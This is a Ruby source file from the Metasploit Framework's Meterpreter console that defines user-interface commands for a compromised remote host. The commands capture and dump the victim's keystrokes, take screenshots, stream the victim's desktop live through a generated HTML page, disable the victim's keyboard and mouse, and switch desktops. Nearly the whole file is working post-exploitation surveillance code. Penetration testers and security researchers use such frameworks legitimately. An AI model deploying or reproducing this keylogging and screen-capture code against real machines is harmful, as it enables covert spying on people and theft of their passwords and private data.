# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The user interface portion of the standard API extension.
#
###
class Console::CommandDispatcher::Stdapi::Ui

  Klass = Console::CommandDispatcher::Stdapi::Ui

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    all = {
      "enumdesktops"  => "List all accessible desktops and window stations",
      "getdesktop"    => "Get the current meterpreter desktop",
      "idletime"      => "Returns the number of seconds the remote user has been idle",
      "keyscan_dump"  => "Dump the keystroke buffer",
      "keyscan_start" => "Start capturing keystrokes",
      "keyscan_stop"  => "Stop capturing keystrokes",
      "screenshot"    => "Grab a screenshot of the interactive desktop",
      "screenshare"   => "Watch the remote user's desktop in real time",
      "setdesktop"    => "Change the meterpreters current desktop",
      "uictl"         => "Control some of the user interface components"
      #  not working yet
      # "unlockdesktop" => "Unlock or lock the workstation (must be inside winlogon.exe)",
    }

    reqs = {
      "enumdesktops"  => [ "stdapi_ui_desktop_enum" ],
      "getdesktop"    => [ "stdapi_ui_desktop_get" ],
      "idletime"      => [ "stdapi_ui_get_idle_time" ],
      "keyscan_dump"  => [ "stdapi_ui_get_keys_utf8" ],
      "keyscan_start" => [ "stdapi_ui_start_keyscan" ],
      "keyscan_stop"  => [ "stdapi_ui_stop_keyscan" ],
      "screenshot"    => [ "stdapi_ui_desktop_screenshot" ],
      "screenshare"   => [ "stdapi_ui_desktop_screenshot" ],
      "setdesktop"    => [ "stdapi_ui_desktop_set" ],
      "uictl"         => [
        "stdapi_ui_enable_mouse",
        "stdapi_ui_enable_keyboard"
      ]
    }
    filter_commands(all, reqs)
  end

  #
  # Name for this dispatcher.
  #
  def name
    "Stdapi: User interface"
  end

  #
  # Executes a command with some options.
  #
  def cmd_idletime(*args)
    seconds = client.ui.idle_time

    print_line(
      "User has been idle for: #{Rex::ExtTime.sec_to_s(seconds)}")

    return true
  end

  #
  # Enables/disables user interface mice and keyboards on the remote machine.
  #
  def cmd_uictl(*args)
    if (args.length < 2)
      print_line(
        "Usage: uictl [enable/disable] [keyboard/mouse/all]")
      return true
    end

    case args[0]
      when 'enable'
        case args[1]
          when 'keyboard'
            print_line("Enabling keyboard...")
            client.ui.enable_keyboard
          when 'mouse'
            print_line("Enabling mouse...")
            client.ui.enable_mouse
          when 'all'
            print_line("Enabling all...")
            client.ui.enable_keyboard
            client.ui.enable_mouse
          else
            print_error("Unsupported user interface device: #{args[1]}")
        end
      when 'disable'
        case args[1]
          when 'keyboard'
            print_line("Disabling keyboard...")
            client.ui.disable_keyboard
          when 'mouse'
            print_line("Disabling mouse...")
            client.ui.disable_mouse
          when 'all'
            print_line("Disabling all...")
            client.ui.disable_keyboard
            client.ui.disable_mouse
          else
            print_error("Unsupported user interface device: #{args[1]}")
        end
      else
        print_error("Unsupported command: #{args[0]}")
    end

    return true
  end

  #
  # Tab completion for the uictl command
  #
  def cmd_uictl_tabs(str, words)
    return %w[enable disable] if words.length == 1

    case words[-1]
    when 'enable', 'disable'
      return %w[keyboard mouse all]
    end

    []
  end

  #
  # Grab a screenshot of the current interactive desktop.
  #
  def cmd_screenshot(*args)
    path    = Rex::Text.rand_text_alpha(8) + ".jpeg"
    quality = 50
    view    = false

    screenshot_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner." ],
      "-q" => [ true, "The JPEG image quality (Default: '#{quality}')" ],
      "-p" => [ true, "The JPEG image path (Default: '#{path}')" ],
      "-v" => [ true, "Automatically view the JPEG image (Default: '#{view}')" ]
    )

    screenshot_opts.parse(args) { | opt, idx, val |
      case opt
        when "-h"
          print_line("Usage: screenshot [options]\n")
          print_line("Grab a screenshot of the current interactive desktop.")
          print_line(screenshot_opts.usage)
          return
        when "-q"
          quality = val.to_i
        when "-p"
          path = val
        when "-v"
          view = true if (val =~ /^(t|y|1)/i)
      end
    }

    data = client.ui.screenshot(quality)

    if data
      ::File.open(path, 'wb') do |fd|
        fd.write(data)
      end

      path = ::File.expand_path(path)

      print_line("Screenshot saved to: #{path}")

      Rex::Compat.open_file(path) if view
    else
      print_error("No screenshot data was returned.")
      if client.platform == 'android'
        print_error("With Android, the screenshot command can only capture the host application. If this payload is hosted in an app without a user interface (default behavior), it cannot take screenshots at all.")
      end
    end

    return true
  end

  #
  # Screenshare the current interactive desktop.
  #
  def cmd_screenshare( *args )
    stream_path    = Rex::Text.rand_text_alpha(8) + ".jpeg"
    player_path = Rex::Text.rand_text_alpha(8) + ".html"
    quality = 50
    view    = false
    duration = 1800

    screenshare_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner." ],
      "-q" => [ true, "The JPEG image quality (Default: '#{quality}')" ],
      "-p" => [ true, "The JPEG image path (Default: '#{stream_path}')" ],
      "-v" => [ true, "Automatically view the JPEG image (Default: '#{view}')" ],
      "-d" => [ true, "The stream duration in seconds (Default: 1800)" ] # 30 min
    )

    screenshare_opts.parse( args ) { | opt, idx, val |
      case opt
        when "-h"
          print_line( "Usage: screenshare [options]\n" )
          print_line( "View the current interactive desktop in real time." )
          print_line( screenshare_opts.usage )
          return
        when "-q"
          quality = val.to_i
        when "-p"
          path = val
        when "-v"
          view = true if ( val =~ /^(t|y|1)/i )
        when "-d"
          duration = val.to_i
      end
    }

    print_status("Preparing player...")
    html = %|<html>
<head>
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>Metasploit webcam_stream - #{client.sock.peerhost}</title>
<script language="javascript">
function updateStatus(msg) {
  var status = document.getElementById("status");
  status.innerText = msg;
}

function noImage() {
  document.getElementById("streamer").style = "display:none";
  updateStatus("Waiting");
}

var i = 0;
function updateFrame() {
  var img = document.getElementById("streamer");
  img.src = "#{stream_path}#" + i;
  img.style = "display:";
  updateStatus("Playing");
  i++;
}

setInterval(function() {
  updateFrame();
},25);

</script>
</head>
<body>
<noscript>
  <h2><font color="red">Error: You need Javascript enabled to watch the stream.</font></h2>
</noscript>
<pre>
Target IP  : #{client.sock.peerhost}
Start time : #{Time.now}
Status     : <span id="status"></span>
</pre>
<br>
<img onerror="noImage()" id="streamer">
<br><br>
<a href="http://www.metasploit.com" target="_blank">www.metasploit.com</a>
</body>
</html>
    |

    ::File.open(player_path, 'wb') do |f|
      f.write(html)
    end

    path = ::File.expand_path(player_path)
    if view
      print_status("Opening player at: #{path}")
      Rex::Compat.open_file(player_path)
    else
      print_status("Please open the player manually with a browser: #{path}")
    end

    print_status("Streaming...")
    begin
        ::Timeout.timeout(duration) do
          while client do
            data = client.ui.screenshot( quality )

            if data
              ::File.open(stream_path, 'wb') do |f|
                f.write(data)
              end
              data = nil
            end
          end
        end
      rescue ::Timeout::Error
      ensure
       
      end

      print_status("Stopped")

      return true
  end

  #
  # Enumerate desktops
  #
  def cmd_enumdesktops(*args)
    print_line("Enumerating all accessible desktops")

    desktops = client.ui.enum_desktops

    desktopstable = Rex::Text::Table.new(
      'Header'  => "Desktops",
      'Indent'  => 4,
      'Columns' => [  "Session",
              "Station",
              "Name"
            ]
    )

    desktops.each { | desktop |
      session = desktop['session'] == 0xFFFFFFFF ? '' : desktop['session'].to_s
      desktopstable << [ session, desktop['station'], desktop['name'] ]
    }

    if desktops.length == 0
      print_line("No accessible desktops were found.")
    else
      print("\n" + desktopstable.to_s + "\n")
    end

    return true
  end

  #
  # Get the current meterpreter desktop.
  #
  def cmd_getdesktop(*args)

    desktop = client.ui.get_desktop

    session = desktop['session'] == 0xFFFFFFFF ? '' : "Session #{desktop['session'].to_s}\\"

    print_line("#{session}#{desktop['station']}\\#{desktop['name']}")

    return true
  end

  #
  # Change the meterpreters current desktop.
  #
  def cmd_setdesktop(*args)

    switch   = false
    dsession = -1
    dstation = 'WinSta0'
    dname    = 'Default'

    setdesktop_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner." ],
      #"-s" => [ true, "The session (Default: '#{dsession}')" ],
      "-w" => [ true, "The window station (Default: '#{dstation}')" ],
      "-n" => [ true, "The desktop name (Default: '#{dname}')" ],
      "-i" => [ true, "Set this desktop as the interactive desktop (Default: '#{switch}')" ]
    )

    setdesktop_opts.parse(args) { | opt, idx, val |
      case opt
        when "-h"
          print_line("Usage: setdesktop [options]\n")
          print_line("Change the meterpreters current desktop.")
          print_line(setdesktop_opts.usage)
          return
        #when "-s"
        #  dsession = val.to_i
        when "-w"
          dstation = val
        when "-n"
          dname = val
        when "-i"
          switch = true if (val =~ /^(t|y|1)/i)
      end
    }

    if client.ui.set_desktop(dsession, dstation, dname, switch)
      print_line("#{ switch ? 'Switched' : 'Changed' } to desktop #{dstation}\\#{dname}")
    else
      print_line("Failed to #{ switch ? 'switch' : 'change' } to desktop #{dstation}\\#{dname}")
    end

    return true
  end

  #
  # Unlock or lock the desktop
  #
  def cmd_unlockdesktop(*args)
    mode = 0
    if args.length > 0
      mode = args[0].to_i
    end

    if mode == 0
      print_line("Unlocking the workstation...")
      client.ui.unlock_desktop(true)
    else
      print_line("Locking the workstation...")
      client.ui.unlock_desktop(false)
    end

    return true
  end

  #
  # Start the keyboard sniffer
  #
  def cmd_keyscan_start(*args)
    trackwin = false

    keyscan_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner." ],
      "-v" => [ false, "Verbose logging: tracks the current active window in which keystrokes are occuring." ]
    )

    keyscan_opts.parse(args) { | opt |
      case opt
       when "-h"
        print_line("Usage: keyscan_start <options>")
        print_line("Starts the key logger")
        print_line(keyscan_opts.usage)
        return
       when "-v"
        print_line("Verbose logging selected ...")
        trackwin = true
       end
    }

    print_line("Starting the keystroke sniffer ...")
    client.ui.keyscan_start(trackwin)
    return true
  end

  #
  # Stop the keyboard sniffer
  #
  def cmd_keyscan_stop(*args)
    print_line("Stopping the keystroke sniffer...")
    client.ui.keyscan_stop
    return true
  end

  #
  # Dump captured keystrokes
  #
  def cmd_keyscan_dump(*args)
    print_line("Dumping captured keystrokes...")
    data = client.ui.keyscan_dump
    print_line(data + "\n")      # the additional newline is to keep the resulting output
                                 # from crowding the Meterpreter command prompt, which
                                 # is visually frustrating without color
    return true
  end

end

end
end
end
end
